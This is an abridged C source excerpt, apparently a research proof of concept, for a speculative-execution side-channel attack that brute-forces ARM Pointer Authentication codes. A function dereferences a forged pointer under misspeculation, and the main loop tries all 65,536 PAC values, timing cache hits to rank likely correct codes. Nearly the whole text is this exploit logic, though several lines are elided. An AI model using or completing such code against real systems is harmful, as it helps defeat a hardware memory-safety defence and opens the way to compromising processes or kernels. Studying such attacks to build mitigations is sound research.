...
#endif
#define BRANCH_PREDICTION_LOOP 6
...
#define PAC_SHIFT 40
#define PAC_MASK (0xffffULL << PAC_SHIFT)
#define BRUTEFORCE_TRIALS 100
#define HIT_THRESHOLD_NS 100ULL
...
void vulnerable_func(void* probe, long pageSize, char * str, int transient,int spec_window_orrs){
    ...
    if(transient){
        ...
        //memcpy((void*)new_obj->buf, safe_str, sizeof(object)); // AUT SUCCESS (correct PAC)
        memcpy((void*)new_obj->buf, str, sizeof(object)); // AUT FAIL (wrong PAC)
...
int main(int argc, char **argv) {
    ...
    const int spec_window_orrs = 60;
    uint32_t top_pac[100] = {0};
    uint32_t top_score[100] = {0};
    uint64_t top_avg[100] = {0};
    for (uint32_t bruteforce = 0; bruteforce < (1u << 16); ++bruteforce) {
        uintptr_t guess = ((uintptr_t)malicious_ptr & ~PAC_MASK) |
            ((uintptr_t)bruteforce << PAC_SHIFT);
        void *guess_ptr = (void*)guess;
        memcpy(malicious_payload + fp_offset, &guess_ptr, sizeof(guess_ptr));
        test_ptr = (char*)malicious_payload;
        uint32_t score = 0;
        uint64_t total = 0;
        for (int trial = 0; trial < BRUTEFORCE_TRIALS; ++trial) {
            ...
            uint64_t dt = t2 - t1;
            total += dt;
            if (dt <= HIT_THRESHOLD_NS) score++;

            cache_flush(probe + pageSize * TRANSIENT_ACCESS_PAGE * 2);
        }

        uint64_t avg = total / BRUTEFORCE_TRIALS;
        int insert_at = -1;
        for (int k = 0; k < 100; ++k) {
            if (score > top_score[k] ||
                (score == top_score[k] && (top_avg[k] == 0 || avg < top_avg[k]))) {
                insert_at = k;
                break;
            }
        }
        if (insert_at >= 0) {
            for (int k = 99; k > insert_at; --k) {
                top_score[k] = top_score[k - 1];
                top_pac[k] = top_pac[k - 1];
                top_avg[k] = top_avg[k - 1];
            }
            top_score[insert_at] = score;
            top_pac[insert_at] = bruteforce;
            top_avg[insert_at] = avg;
        }
    }

    printf("top_pac results (score desc, avg asc):\n");
    for (int k = 0; k < 100; ++k) {
        printf("rank=%d pac=0x%04x score=%u avg_ns=%llu\n",
               k + 1, top_pac[k], top_score[k],
               (unsigned long long)top_avg[k]);
    }
